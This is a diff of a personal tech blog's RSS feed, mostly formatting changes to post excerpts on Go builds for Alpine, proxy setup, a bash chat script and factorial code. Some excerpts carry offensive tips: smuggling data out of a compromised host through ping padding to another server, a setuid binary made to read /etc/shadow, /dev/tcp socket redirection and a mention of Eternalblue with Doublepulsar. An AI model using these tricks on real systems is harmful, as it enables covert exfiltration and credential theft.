@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>code on wrfly&#39;s blog</title>
@@ -139,8 +139,8 @@ Firstly I thought it was a bug of docker resigtry, but as I&amp;rsquo;m digging 
 原因与直觉相同，因为二者系统的动态链接库不同，alpine用了精简版的libc，不是glibc。
 如果build binary的时候没有用到系统的依赖，那么则不会出现依赖性问题。
 解决方法有两种，在build的时候：
- go build -ldflags &amp;ldquo;-s -w&amp;rdquo; -a -tagsnetgo -installsuffix netgo
- CGO_ENABLED=0 go build -ldflags &amp;ldquo;-s&amp;rdquo; -a -installsuffix cgo .
+  go build -ldflags &amp;ldquo;-s -w&amp;rdquo; -a -tagsnetgo -installsuffix netgo
+  CGO_ENABLED=0 go build -ldflags &amp;ldquo;-s&amp;rdquo; -a -installsuffix cgo .
   见：
  &amp;lt;http://www.jeffsloyer.io/post date: 2017-07-04 title: go程序依赖问题 https://stackoverflow.com/questions/36279253/go-compiled-binary-wont-run-in-an-alpine-docker-container-on-ubuntu-host  </description>
     </item>
@@ -166,9 +166,9 @@ Eternalblue + Doublepulsar use Eternalblue 中间按照提示填入相应的IP�
       
       <guid>https://wrfly.kfd.me/posts/%E8%BF%98%E6%98%AF%E4%BB%A3%E7%90%86/</guid>
       <description>sublimetext的PackageControl连接总是超时，但是手头又没有http的代理，都是用的shadowsocks，然后就要想个办法怎样把socks5代理转换成http代理。
-先是大体搜了一下，解决方案有这两种： - proxychains - tsocks
-但是这两种代理都不复合我的要求，因为他们只能代理一次请求，不会持续listen一个端口，然后提供服务。
-不得已之下，自己&amp;rdquo;写&amp;rdquo;一个吧。
+先是大体搜了一下，解决方案有这两种：
+ proxychains tsocks  但是这两种代理都不复合我的要求，因为他们只能代理一次请求，不会持续listen一个端口，然后提供服务。
+不得已之下，自己&amp;quot;写&amp;quot;一个吧。
 https://github.com/wrfly/hovers
 其实到后来才搜到，有个老牌的代理软件：privoxy，安装之后，在配置文件里添加 forward-socks5 / 127.0.0.1:1080 . 就可以了。其中127.0.0.1:1080是socks5的代理地址。
 然后在sublime中配置一下： ~/.config/sublime-text-3/Packages/User/Package Control.sublime-settings
@@ -293,7 +293,7 @@ mode 1: 把本机的 port1 跟 host2 的 port2 连接起来(bind to connect)
       <pubDate>Sat, 05 Dec 2015 00:00:00 +0000</pubDate>
       
       <guid>https://wrfly.kfd.me/posts/%E5%87%A0%E4%B8%AAhack%E5%B0%8F%E6%8A%80%E5%B7%A7/</guid>
-      <description>ping  -p pattern You may specify up to 16 ``pad&amp;rdquo; bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
+      <description>ping  -p pattern You may specify up to 16 ``pad&amp;rsquo;&amp;rsquo; bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
  如果渗透到了一台机子却只能往外发ping怎么办？ -p 就可以搞定了。
 举个例子
 ping -c 1 -p `echo -n hello | xxd -ps` anoth_server 然后在another_server上面通过tcpdump就可以接收到hello。
@@ -317,7 +317,8 @@ S标志位的前提：文件必须是二进制可执行文件。
 编译之后运行一下，如果不是root用户或者shadow用户组的人运行这个程序，就会提示不允许这样做。
 那么我们把这个文件给root，然后再给他s标志位：
 sudo chown root catshadow &amp;amp;&amp;amp; sudo chmod +s catshadow
-OK，再来运行一下就可以读取shadow里面的内容了。</description>
+OK，再来运行一下就可以读取shadow里面的内容了。
+然后看一下程序的USER：</description>
     </item>
     
     <item>
@@ -337,7 +338,7 @@ A$ ncat -lp 8080 B$ exec 3&amp;lt;&amp;gt; /dev/tcp/127.0.0.1/80 B$ echo &amp;#3
 信息加密解密方法：
 en(){ echo $1|openssl aes-256-cbc -k pass -e |openssl aes-256-cbc -k pass -d; } 这个小函数是用来测试加密解密的。
 然后说下脚本的思路：
- 登陆，确定用户身份，用户名长度要过滤，防止恶意输入 房间选择，也要过滤，因为是要创建一个新的文档，所以必须过滤掉&amp;rdquo;. / \&amp;ldquo;等一系列特殊字符，默认是public房间，即所有用户输入输出均在public文件中。 消息IO，这个是聊天的核心，但是实现起来并不是很难，tail -f一直检测文件变化，因为所有的用户输入都保存到了“chat_room”这个文件里，当有新用户发言的时候所有同一房间下的用户都会收到消息，相当于群聊。如果是想两个人聊天，就可以两个人新建一个聊天室，也就相当于一对一的聊天了。 数据包格式，这个好弄，时间，用户名，消息数据。 安全性。远程的安全性永远的不到保障，所以只能在客户端解决。Wait~ 扩展：文件传输，表情包，tmux扩展，发送图片（asciiview）  问题  进程间通信，用tail读取文件 父进程退出之后，子进程不退出（tail -f &amp;ndash;pid $$） kill 命令用法 命令行输出颜色 （echo -e &amp;ldquo;balabala&amp;rdquo;） $$ 和 $!</description>
+ 登陆，确定用户身份，用户名长度要过滤，防止恶意输入 房间选择，也要过滤，因为是要创建一个新的文档，所以必须过滤掉&amp;rdquo;. / &amp;quot;等一系列特殊字符，默认是public房间，即所有用户输入输出均在public文件中。 消息IO，这个是聊天的核心，但是实现起来并不是很难，tail -f一直检测文件变化，因为所有的用户输入都保存到了“chat_room”这个文件里，当有新用户发言的时候所有同一房间下的用户都会收到消息，相当于群聊。如果是想两个人聊天，就可以两个人新建一个聊天室，也就相当于一对一的聊天了。 数据包格式，这个好弄，时间，用户名，消息数据。 安全性。远程的安全性永远的不到保障，所以只能在客户端解决。Wait~ 扩展：文件传输，表情包，tmux扩展，发送图片（asciiview）  问题  进程间通信，用tail读取文件 父进程退出之后，子进程不退出（tail -f &amp;ndash;pid $$） kill 命令用法 命令行输出颜色 （echo -e &amp;ldquo;balabala&amp;rdquo;） $$ 和 $!</description>
     </item>
     
     <item>
@@ -347,7 +348,7 @@ en(){ echo $1|openssl aes-256-cbc -k pass -e |openssl aes-256-cbc -k pass -d; } 
       
       <guid>https://wrfly.kfd.me/posts/%E5%A4%A7%E6%95%B0%E7%9A%84%E9%98%B6%E4%B9%98/</guid>
       <description>To calculate factorial in linux c &amp;amp; bash shell &amp;amp; bc.
-linux c version: #include &amp;lt;stdio.h&amp;gt;int big[10001][800],len[10001],BASE=10000; int i,j,tmp,up,n; void print(int n){ printf(&amp;#34;%d&amp;#34;,big[n][len[n]-1]); for(i=len[n]-2; i &amp;gt;= 0; i--)printf(&amp;#34;%04d&amp;#34;,big[n][i]); printf(&amp;#34;\n&amp;#34;); } int main(){ big[0][0] = big[1][0] = len[0] = len[1] = 1; //0和1的阶乘都是1  for(i=2; i&amp;lt;=10000; i++){ //计算10000以内的所有数的阶乘  up = 0; for(j=0; j&amp;lt;len[i-1]; j++){ tmp = up + i * big[i-1][j]; up = tmp / BASE; tmp = tmp % BASE; big[i][j] = tmp; } if(up &amp;gt; 0){ big[i][j] = up;len[i] = j+1; } else len[i] = j; } while(~scanf(&amp;#34;%d&amp;#34;,&amp;amp;n))print(n); return 0; } bash shell version: #!</description>
+linux c version: #include &amp;lt;stdio.h&amp;gt;int big[10001][800],len[10001],BASE=10000; int i,j,tmp,up,n; void print(int n){ printf(&amp;#34;%d&amp;#34;,big[n][len[n]-1]); for(i=len[n]-2; i &amp;gt;= 0; i--)printf(&amp;#34;%04d&amp;#34;,big[n][i]); printf(&amp;#34;\n&amp;#34;); } int main(){ big[0][0] = big[1][0] = len[0] = len[1] = 1; //0和1的阶乘都是1  for(i=2; i&amp;lt;=10000; i++){ //计算10000以内的所有数的阶乘  up = 0; for(j=0; j&amp;lt;len[i-1]; j++){ tmp = up + i * big[i-1][j]; up = tmp / BASE; tmp = tmp % BASE; big[i][j] = tmp; } if(up &amp;gt; 0){ big[i][j] = up;len[i] = j+1; } else len[i] = j; } while(~scanf(&amp;#34;%d&amp;#34;,&amp;amp;n))print(n); return 0; }  bash shell version: #!</description>
     </item>
     
     <item>
